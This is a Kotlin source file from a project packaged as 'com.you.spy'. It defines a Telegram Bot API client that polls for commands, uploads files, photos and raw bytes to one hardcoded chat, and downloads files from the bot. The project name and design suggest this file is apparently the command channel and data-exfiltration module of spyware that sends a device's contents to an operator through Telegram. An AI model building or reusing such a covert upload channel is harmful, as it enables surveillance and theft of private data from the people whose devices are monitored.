package com.you.spy.net

import com.you.spy.util.Config
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object TgApi {

    private val http = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS)
        .readTimeout(70, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private fun url(m: String) = "https://api.telegram.org/bot${Config.token}/$m"

    private fun post(method: String, body: okhttp3.RequestBody): JSONObject? = runCatching {
        val req = Request.Builder().url(url(method)).post(body).build()
        http.newCall(req).execute().use { r ->
            val s = r.body?.string() ?: return null
            JSONObject(s)
        }
    }.getOrNull()

    private fun form(vararg kv: Pair<String, String>): okhttp3.RequestBody {
        val b = FormBody.Builder()
        kv.forEach { b.add(it.first, it.second) }
        return b.build()
    }

    suspend fun getMe(): String? = withContext(Dispatchers.IO) {
        val r = post("getMe", form()) ?: return@withContext null
        if (r.optBoolean("ok")) r.optJSONObject("result")?.optString("username") else null
    }

    suspend fun getUpdates(offset: Long, timeout: Int = 50): List<JSONObject> =
        withContext(Dispatchers.IO) {
            val r = post("getUpdates", form(
                "offset" to offset.toString(),
                "timeout" to timeout.toString(),
                "allowed_updates" to "[\"message\"]"
            )) ?: return@withContext emptyList()
            val arr = r.optJSONArray("result") ?: return@withContext emptyList()
            (0 until arr.length()).map { arr.getJSONObject(it) }
        }

    suspend fun send(text: String, markup: String? = null): Boolean = withContext(Dispatchers.IO) {
        val body = FormBody.Builder()
            .add("chat_id", Config.chat)
            .add("text", text.take(4096))
            .add("parse_mode", "HTML")
            .add("disable_web_page_preview", "true")
            .apply { if (markup != null) add("reply_markup", markup) }
            .build()
        post("sendMessage", body)?.optBoolean("ok") ?: false
    }

    suspend fun edit(msgId: Long, text: String): Boolean = withContext(Dispatchers.IO) {
        post("editMessageText", form(
            "chat_id" to Config.chat,
            "message_id" to msgId.toString(),
            "text" to text.take(4096),
            "parse_mode" to "HTML"
        ))?.optBoolean("ok") ?: false
    }

    suspend fun typing(action: String = "typing") = withContext(Dispatchers.IO) {
        post("sendChatAction", form("chat_id" to Config.chat, "action" to action))
        Unit
    }

    suspend fun sendFile(file: File, asPhoto: Boolean, caption: String? = null): Boolean =
        withContext(Dispatchers.IO) {
            val mime = if (asPhoto) "image/jpeg" else "application/octet-stream"
            val part = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.chat)
                .addFormDataPart(
                    if (asPhoto) "photo" else "document",
                    file.name,
                    file.asRequestBody(mime.toMediaType())
                )
                .apply { if (caption != null) addFormDataPart("caption", caption.take(1024)) }
                .build()
            post(if (asPhoto) "sendPhoto" else "sendDocument", part)?.optBoolean("ok") ?: false
        }

    suspend fun sendBytes(bytes: ByteArray, name: String, asPhoto: Boolean, caption: String? = null): Boolean =
        withContext(Dispatchers.IO) {
            val mime = if (asPhoto) "image/jpeg" else "application/octet-stream"
            val part = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.chat)
                .addFormDataPart(if (asPhoto) "photo" else "document", name, bytes.toRequestBody(mime.toMediaType()))
                .apply { if (caption != null) addFormDataPart("caption", caption.take(1024)) }
                .build()
            post(if (asPhoto) "sendPhoto" else "sendDocument", part)?.optBoolean("ok") ?: false
        }

    suspend fun download(fileId: String, dest: File): File? = withContext(Dispatchers.IO) {
        runCatching {
            val r = post("getFile", form("file_id" to fileId)) ?: return@withContext null
            val path = r.optJSONObject("result")?.optString("file_path") ?: return@withContext null
            val req = Request.Builder()
                .url("https://api.telegram.org/file/bot${Config.token}/$path").build()
            http.newCall(req).execute().use { resp ->
                resp.body?.byteStream()?.use { input ->
                    dest.outputStream().use { input.copyTo(it) }
                }
            }
            dest
        }.getOrNull()
    }
}
